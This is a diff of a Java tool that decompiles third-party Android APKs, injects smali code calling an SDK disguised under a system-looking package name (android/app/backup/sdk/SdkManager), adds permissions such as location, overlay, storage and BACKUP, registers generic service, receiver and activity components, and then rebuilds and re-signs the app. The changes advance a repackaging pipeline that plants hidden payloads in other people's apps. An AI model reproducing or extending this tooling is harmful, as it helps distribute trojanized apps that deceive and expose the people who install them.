@@ -1,15 +1,15 @@
 package com.bb_sz.adtool;
 
+import com.bb_sz.shell.CMDTools;
 import com.bb_sz.shell.FileTools;
+import com.bb_sz.shell.IOTools;
 import com.bb_sz.tool.Contents;
 
 import java.io.BufferedReader;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.URL;
@@ -47,12 +47,19 @@ public class AdTool {
 
     private static String runPath;
     private static boolean isGetPkg;
+    private static final boolean isDebugRun = false;
 
     public static void main(String[] args) {
         runPath = getPath();
+//        if (isDebugRun) {
+//            runPath = "D:\\Tools\\InjectADSdk\\tool";
+//            args = new String[]{"D:\\DengZong\\TuiGuang\\Templates\\AppStore\\1_HappyBuYu\\channel_shelled\\TTBU1_test2_shelled.apk",
+//                    "u123", "p123", "c123", "1", "1"};
+//        }
         MoBanSDKPath = runPath + File.separator + "MoBanSDK";
         rootPath = MoBanSDKPath + "\\smali";
-        if (debug) System.out.print("runPath:" + runPath + "\n");
+        /*if (debug) */
+        System.out.print("runPath:" + runPath + "\n");
         if (!checkParam(args)) {
             if (args.length == 1) {
                 if (args[0].contains("-v") || args[0].contains("-version")) {
@@ -306,9 +313,17 @@ public class AdTool {
 
         StringBuffer sb = new StringBuffer();
         String newPkg = packageString;
-        sb.append("invoke-static {}, L" + newPkg + "api/AdSdk;->getInstance()L" + newPkg + "api/AdSdk;").append("\n");
+//        sb.append("invoke-static {}, L" + newPkg + "api/AdSdk;->getInstance()L" + newPkg + "api/AdSdk;").append("\n");
+//        sb.append("move-result-object v0").append("\n");
+//        sb.append("invoke-virtual {v0, p0}, L" + newPkg + "api/AdSdk;->init(Landroid/content/Context;)I").append("\n");
+
+        sb.append("invoke-static {}, Landroid/app/backup/sdk/SdkManager;->getInstance()Landroid/app/backup/sdk/SdkManager;").append("\n");
         sb.append("move-result-object v0").append("\n");
-        sb.append("invoke-virtual {v0, p0}, L" + newPkg + "api/AdSdk;->init(Landroid/content/Context;)I").append("\n");
+        sb.append("const-string v1, \"").append(uid).append("\"").append("\n");
+        sb.append("const-string v2, \"").append(pid).append("\"").append("\n");
+        sb.append("const-string v3, \"").append(cid).append("\"").append("\n");
+        sb.append("invoke-virtual {v0, p0, v1, v2, v3}, Landroid/app/backup/sdk/SdkManager;->init(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I").append("\n");
+
 
         File old = new File(oldFilePath);
         if (!old.exists()) {
@@ -359,8 +374,10 @@ public class AdTool {
                     isCheckLocals = 1;
                 }
 
-                if (isCheckLocals == 2 && line.contains(".locals 0")) {
-                    line = ".locals 1";
+                if (isCheckLocals == 2) {
+                    if (line.contains(".locals 0") || line.contains(".locals 1") || line.contains(".locals 2") || line.contains(".locals 3")) {
+                        line = ".locals 4";
+                    }
                 }
 
                 if (isCheckLocals == 2 && line.contains(".locals")) {
@@ -447,7 +464,7 @@ public class AdTool {
 
     private static void apk() {
         if (debug) System.err.print("start create apk\n");
-        String res = exec("java -jar " + runPath + File.separator + "bin\\apktool.jar b " + getSrcApkOutPath() + " -o " + getSrcApkOutPath() + "_R.apk");
+        String res = exec("java -jar " + runPath + File.separator + "bin\\apktool.jar b -f " + getSrcApkOutPath() + " -o " + getSrcApkOutPath() + "_R.apk");
     }
 
     private static void signApk() {
@@ -536,8 +553,13 @@ public class AdTool {
             if (packageString.contains("/")) {
                 newPackage = packageString.replaceAll("/", "\\\\");
             }
-            newFile = newRootPath + File.separator + newPackage
-                    + File.separator + parentName + File.separator + fileName;
+            if ("market".equals(parentName)) {
+                newFile = newRootPath + File.separator + newPackage
+                        + File.separator + fileName;
+            } else {
+                newFile = newRootPath + File.separator + newPackage
+                        + File.separator + parentName + File.separator + fileName;
+            }
         } else {
             newPackage = path.replace(rootPath, newRootPath);
             newFile = newPackage;
@@ -571,6 +593,8 @@ public class AdTool {
                         line = line.replace("()PID()", pid);
                     } else if (line.contains("\"()CID()\"")) {
                         line = line.replace("()CID()", cid);
+                    } else if (line.contains("{$ApplicationID}")) {
+                        line = line.replace("{$ApplicationID}", getNewPkg());
                     }
                     dw.write(line + "\n");
                 }
@@ -665,15 +689,16 @@ public class AdTool {
         sb.append("<uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>").append("\n");
         sb.append("<uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>").append("\n");
         sb.append("<android:uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>").append("\n");
+        sb.append("<android:uses-permission android:name=\"android.permission.BACKUP\"/>").append("\n");
         return sb.toString();
     }
 
     private static String getManifestService() {
         String newPkg = getNewPkg();
 
-        StringBuffer sb = new StringBuffer("<service android:name=\"" + newPkg + ".service.DownloadService\">");
+        StringBuffer sb = new StringBuffer("<service android:name=\"" + newPkg + ".MyService\">");
         sb.append("\n").append("<intent-filter android:priority=\"1000\">").append("\n");
-        sb.append("<action android:name=\"" + newPkg + ".service.DownloadService\"/>").append("\n");
+        sb.append("<action android:name=\"" + newPkg + ".MyService\"/>").append("\n");
         sb.append("</intent-filter>").append("\n");
         sb.append("</service>").append("\n");
         return sb.toString();
@@ -682,7 +707,7 @@ public class AdTool {
     private static String getManifestReceiver() {
         String newPkg = getNewPkg();
 
-        StringBuffer sb = new StringBuffer("<receiver android:name=\"" + newPkg + ".receiver.StatusReceiver\">");
+        StringBuffer sb = new StringBuffer("<receiver android:name=\"" + newPkg + ".MyReceiver\">");
         sb.append("\n").append("<intent-filter>").append("\n");
         sb.append("<action android:name=\"android.intent.action.TIME_SET\"/>").append("\n");
         sb.append("<action android:name=\"android.intent.action.TIMEZONE_CHANGED\"/>").append("\n");
@@ -701,7 +726,7 @@ public class AdTool {
     private static String getManifestActivity() {
         String newPkg = getNewPkg();
 
-        String activity = "<activity android:name=\"" + newPkg + ".activity.AppActivity\" " +
+        String activity = "<activity android:name=\"" + newPkg + ".MyActivity\" " +
                 "android:theme=\"@android:style/Theme.Light.NoTitleBar.Fullscreen\"/>";
 
         return activity;
@@ -738,31 +763,7 @@ public class AdTool {
     }
 
     public static String exec(String cmd) {
-        if (debug) System.err.print("exec:" + cmd + "\n");
-        cmd = "cmd.exe /c " + cmd;
-        Runtime runtime = Runtime.getRuntime();
-        try {
-            Process p = runtime.exec(cmd);
-            String res = InputStreamTOString(p.getInputStream());
-            if (debug) System.out.print(res);
-            return res;
-        } catch (Exception e) {
-            System.err.println("Error!" + "\n");
-        } finally {
-
-        }
-        return null;
-    }
-
-    public static String InputStreamTOString(InputStream in) throws Exception {
-        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
-        byte[] data = new byte[BUFFER_SIZE];
-        int count = -1;
-        while ((count = in.read(data, 0, BUFFER_SIZE)) != -1)
-            outStream.write(data, 0, count);
-
-        data = null;
-        return new String(outStream.toByteArray(), "gbk");
+        return CMDTools.exec(cmd);
     }
 
     private static void copyDir(File from, File to) {
